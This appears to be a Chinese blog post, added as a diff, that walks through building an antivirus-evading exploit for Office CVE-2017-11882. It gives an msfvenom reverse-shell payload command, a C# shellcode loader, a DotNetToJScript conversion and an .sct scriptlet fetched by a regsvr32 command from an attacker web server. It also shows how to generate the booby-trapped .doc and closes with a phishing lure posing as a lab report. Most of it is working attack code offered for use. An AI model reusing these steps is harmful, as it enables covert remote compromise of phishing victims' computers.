@@ -1,0 +1,179 @@
+---
+layout: post
+title: "Office CVE-2017-11882实战免杀"
+date: 2017-11-25 0:20:56
+categories: jekyll update
+---
+
+## 放在前面
+&emsp;这里真的要感谢@余弦在懒人在思考的公众号里发过的关于MSF免杀payload的<a href="https://mp.weixin.qq.com/s/OxgJIIPaXMXqrY5lPdukdA">推文</a>,正是看着这篇文章，再联想到最近火热的`office cve-2017-11882`，才成功的构造了`免杀的利用脚本`。
+
+## 介绍
+&emsp;因为关于office 11882的复现及利用都是使用mshta，这个利用方法已经被各杀软重点关注了，所以被拦截的概率会很大，上一篇复现时，连电脑管家都拦截提示了！！所以一个免杀的方法就是使用别的利用工具，而弦哥的这个推文刚好被我从公众号里搜索到，其实很多时候，我们虽然在众里寻他千百度，但很多人却`没有`“蓦然回首”。关注了这个漏洞的利用脚本的人都知道关键点是可注入的字符越长越好，方便利用，如果要换利用方式的话，替换注入字符就行，而这篇文章也是利用了这一点。
+
+### 目录
+* [一：生成payload](#1)
+* [二：创建C#工程文件](#2)
+* [三：将生成的exe转换成js](#3)
+* [四：结合web server](#4)
+* [五：office上场](#5)
+* [六：关于钓鱼](#6)
+
+### <a name="1"></a>一：生成payload
+&emsp;使用`msfvenom`生成C#的payload
+
+```shell
+msfvenom  -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.231 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe
+```
+
+&emsp;虽然在弦哥的推文中说不用解释选线意义，但出于学习，我还是记录一下：
+参数说明：-p：选择载荷模块；-a：系统架构（几位）；-f：生成文件的格式；-b：设定规避字符集； PrependMigrate 和 PrependMigrateProc是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。
+    
+### <a name="2"></a>二：创建C#工程文件
+&emsp;这里我使用vs2015，我这里.Net Framework本来是没有2.0的，是自己装的，vs2013就有。创建的新项目如下图： 
+<div align="center">
+    <img src="/images/posts/office1/1.png" height="300" width="500">  
+</div>
+
+&emsp;将如下代码黏贴覆盖到 Program.cs 中：
+```c#
+using System;
+using System.Threading;
+using System.Runtime.InteropServices;
+namespace MSFWrapper
+{
+    public class Program
+    {
+        public Program()
+        {
+           RunMSF();
+        }
+        public static void RunMSF()
+        {
+            byte[] MsfPayload = {
+            //Paste your Payload here
+        };
+            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);
+            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);
+            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);
+            Thread.Sleep(2000);
+        }
+        public static void Main()
+        {
+        }
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    }
+}
+```
+
+&emsp;然后将先前生成的 Payload 的黏贴到代码中注释为“//Paste your Payload here”的地方。这里注意只需要复制那些0x开头的字符，而不需要整个复制下来粘贴。保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”, 然后保存。如下图：
+<div align="center">
+    <img src="/images/posts/office1/2.png" height="300" width="500">  
+</div>
+
+&emsp;在Release 版中添加对X86的支持，然后编译出来，可以得到一个（项目名.exe）
+<div align="center">
+    <img src="/images/posts/office1/3.png" height="300" width="500">  
+</div>
+
+### <a name="3"></a>三：将生成的exe转换成js
+&emsp;这里我们使用DotNetToJScript ，这是一款可以将 .net 程序转换为 jscript 代码的工具，下载地址：<a href="https://github.com/tyranid/DotNetToJScript/releases">DotNetToJScript</a>。下载好后进入项目文件夹，运行下面的命令：
+```shell
+E:\tools\DotNetToJScript>DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program 86.exe
+```
+
+&emsp;这里的86.exe是上面编译生成的文件。运行后可以得到MSFWrapper.js，接下来我们用msf开始监听，这里不细说，直接贴图：
+<div align="center">
+    <img src="/images/posts/office1/4.png" />  
+</div>
+
+然后我们就可以用下面的命令执行我们的 MSF Payload：
+```shell
+C:\windows\SysWOW64\cscript.exe MSFWrapper.js
+```
+<div align="center">
+    <img src="/images/posts/office1/5.png" />  
+</div>
+
+运行后，电脑管家跟360跟啥事都没发生过一样。。。。而我们已经Get Shell了
+<div align="center">
+    <img src="/images/posts/office1/6.png" />  
+</div>
+
+&emsp;到了这里，我们已经可以基本确定弦哥的方法是可行的了。因为要跟office 结合起来，所以我们还需要继续。
+    
+### <a name="4"></a>四：结合web server
+&emsp;本地bypass是不够的，我们需要结合web server扩大影响。既然能够转换为 js 代码，那么我们自然会想到 sct。我们将转换后的 js 代码黏贴到下面代码中的“//paste code here”：
+```
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="Msf"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+    <script language="JScript">
+    //paste code here
+    </script>
+</registration>
+</scriptlet>
+```
+&emsp;保存为 msf.sct（后缀名可以更改，比如 jpg 等），这里注意，第一行一定要放在文件的第一行（第一行不能为空或其他），不然会出错，然后上传至 Web Server。
+
+### <a name="5"></a>五：office上场
+&emsp;我们需要注入：
+```shell
+regsvr32 /s /u /n /i:http://192.168.1.231/msf.sct c:\windows\SysWOW64\scrobj.dll
+```
+<div align="center">
+    <img src="/images/posts/office1/7.png" />  
+</div>
+
+&emsp;才80个字节，现在的exp已经支持109字节了，所以，我们可以顺利的注入进去。这里我使用https://github.com/Ridter/CVE-2017-11882。命令如下：
+```shell
+root@Kali:~/hackhub/CVE-2017-11882# python Command109b_CVE-2017-11882.py -c "regsvr32 /s /u /n /i:http://192.168.1.231/msf.sct c:\windows\SysWOW64\scrobj.dll" -o hello.doc
+```
+
+&emsp;这里需要注意我们使用109b的脚本，不要使用43B的。
+&emsp;PS：最厉害的exp已经支持605字节，已经很厉害了！！附上项目地址：
+https://github.com/unamer/CVE-2017-11882/ 。这样一来姿势又多了。
+
+&emsp;把生成的文件发送给靶机，并打开该doc。
+<div align="center">
+    <img src="/images/posts/office1/8.png" />  
+</div>
+<br>
+<div align="center">
+    <img src="/images/posts/office1/9.png" />  
+</div>
+
+可以看到，我们又接收到一个shell，而且注意到电脑管家是全程静默的，没有任何提示及报毒。
+    
+&emsp;接下来，我关掉电脑管家，启用360.。
+<div align="center">
+    <img src="/images/posts/office1/10.png" />  
+</div>
+
+&emsp;可见360的预防效果还是强于电脑管家，但如果用户点击允许运行的话，360也不能阻止恶意的网络连接，最终还是能get shell的。
+<div align="center">
+    <img src="/images/posts/office1/11.png" />  
+</div>
+
+&emsp;这里再安利一下卡巴斯基，老毛子的杀软，像这样的文件，老毛子会告诉你什么是残酷，我把文件从虚拟机复制出来。
+
+<div align="center">
+    <img src="/images/posts/office1/12.png" />  
+</div>
+
+能活过1秒算我输。。。。    
+
+
+### <a name="6"></a>六：关于钓鱼
+<div align="center">
+    <img src="/images/posts/office1/13.png" />  
+</div>
+
+&emsp;这模板是不是很有诱惑~ 哈哈
+&emsp;画风就变成这样：同学同学，我的实验报告写完了，你要。。。不。。。要。。。借鉴一下？？（手动给个滑稽）
+
